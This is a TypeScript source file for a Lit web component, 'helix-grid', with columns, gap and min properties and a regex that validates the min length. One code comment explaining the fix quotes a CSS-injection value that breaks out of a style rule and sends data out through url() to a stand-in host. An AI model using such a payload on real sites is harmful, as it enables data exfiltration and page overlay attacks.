import { customElement, HelixElement } from '@fusion.dev/helix-core'
import type { CSSResultGroup, PropertyValues, TemplateResult } from 'lit'
import { html } from 'lit'
import { property } from 'lit/decorators.js'
import { styles } from './grid-root.css.js'

/**
 * @summary Lays children out on a grid.
 *
 * @description
 * Two ways to declare columns, and only two. `columns` is a fixed count;
 * `min` fills as many equal columns as fit above that width, which is a
 * responsive layout with no breakpoint to maintain. Setting `min` wins, because
 * a fixed count that also reflows is two intentions in one element.
 *
 * Presentation only, so there is no headless tier.
 *
 * @since 0.1.0
 * @status stable
 * @category layout
 * @aliases Layout, Columns
 * @documentation https://fusion.dev/helix/components/grid
 *
 * @slot - The items to lay out.
 *
 * @cssproperty --grid-columns - An explicit track list, which wins over `min` and `columns`. For a layout of unequal tracks, which neither attribute can say.
 */
@customElement('helix-grid')
export class HelixGrid extends HelixElement {
  /**
   * Alignment of each cell within its row.
   */
  @property({ reflect: true })
  align?: 'start' | 'center' | 'end' | 'stretch'

  /**
   * Fixed number of equal columns.
   */
  @property({ reflect: true, type: Number })
  columns?: number

  /**
   * Space between cells, named on the space scale.
   */
  @property({ reflect: true })
  gap?: 'none' | '2xs' | 'xs' | 'sm' | 'md' | 'lg' | 'xl' | '2xl' | '3xl'

  /**
   * Minimum column width, filling as many as fit.
   *
   * Takes precedence over `columns`: a grid that both fixes a count and reflows
   * is two intentions in one element.
   */
  @property()
  min = ''

  /**
   * Writes the track list into the shadow root's own stylesheet.
   *
   * Into a `<style>` rather than onto `this.style`, and the difference is
   * hydration. An inline style on the host is an attribute the element gives
   * itself once it upgrades, so a React consumer's server markup does not have
   * it and hydration reports a mismatch it will not patch up. The shadow root
   * is not part of the tree React hydrates, so a rule written there is free.
   *
   * The element is filled imperatively because Lit refuses expressions inside
   * `<style>`: it is an invalid binding location and throws while rendering
   * rather than at build time. Hence a static, empty element in the template
   * and its `textContent` set here.
   *
   * It sets a custom property rather than the track list itself. A shadow
   * root's adopted stylesheets cascade *after* its own `<style>` elements, and
   * `static styles` is adopted, so a `grid-template-columns` here lost to the
   * one in the stylesheet and every `min` grid came out a single column. The
   * stylesheet only ever reads `--_grid-template`, so there is nothing to
   * lose against.
   *
   * The consequence is that a server-rendered grid falls back to the
   * stylesheet's single column until it upgrades. That is why `columns` is also
   * expressed as plain CSS below: the fixed-count case, which can be enumerated,
   * needs no JavaScript at all, and only `min` depends on this.
   */
  private applyTemplate(): void {
    const sheet = this.renderRoot.querySelector<HTMLStyleElement>('#template')
    if (!sheet) {
      return
    }
    /* **`min` is checked against a length before it reaches a stylesheet, and
       that is a security fix rather than tidiness.** It is a public attribute
       and it was concatenated into a `<style>` element's text, so
       `min="1px,1fr)} :host{background:url(//elsewhere/?stolen)} @media all{"`
       closed the rule and wrote arbitrary CSS into this component's shadow
       root. That is enough to exfiltrate through `url()` and to lay an
       invisible plate over the page.
     *
     * `createSheet` says in its own documentation that consumer input must not
     * be interpolated into CSS, and this was the one place in the library that
     * did it. A pattern rather than an escape, because a length has a small,
     * known grammar and anything outside it is a mistake worth ignoring rather
     * than a string worth repairing. */
    const length = /^-?(?:\d+\.?\d*|\.\d+)(?:px|r?em|%|v[hw]|ch|ex|cm|mm|in|pt|pc|q)$/i
    const min = this.min?.trim() ?? ''
    sheet.textContent =
      min !== '' && length.test(min)
        ? `:host { --_grid-template: repeat(auto-fit, minmax(min(${min}, 100%), 1fr)); }`
        : ''
  }

  /* `updated` alone, and never a `firstUpdated` beside it. Lit puts every
     initial property into the first `changed`, so the pair runs
     `applyTemplate` twice on every mount of a grid with a `min`. */
  protected override updated(changed: PropertyValues): void {
    super.updated(changed)
    if (changed.has('min')) {
      this.applyTemplate()
    }
  }

  protected override render(): TemplateResult {
    return html`<style id="template"></style>
      <slot></slot>`
  }

  static override styles: CSSResultGroup = styles
}

declare global {
  interface HTMLElementTagNameMap {
    'helix-grid': HelixGrid
  }
}
